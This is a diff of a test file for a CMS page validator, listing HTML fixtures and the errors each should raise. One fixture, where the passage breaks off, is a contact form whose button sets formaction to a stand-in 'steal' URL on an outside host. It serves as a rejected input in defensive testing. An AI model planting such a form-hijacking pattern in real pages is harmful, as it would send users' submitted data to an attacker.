@@ -158,7 +158,10 @@ describe("ValidatingCmsRepository — pages", () => {
                 /CMS media item/,
             ],
             ['<fixture-card><img alt=""></fixture-card>', /alternative text/],
-            ['<fixture-card cms-source="https:\/\/example.invalid\/items"></fixture-card>', /same-site endpoint/],
+            [
+                '<fixture-card><section cms-source="https:\/\/example.invalid\/items"></section></fixture-card>',
+                /use cms-query for reads/,
+            ],
             [
                 `<fixture-card><form cms-source="/.cms/call/forms/contact" cms-source-method="POST"
                     cms-source-trigger="submit"><button formaction="https://example.invalid/steal">Send</button>
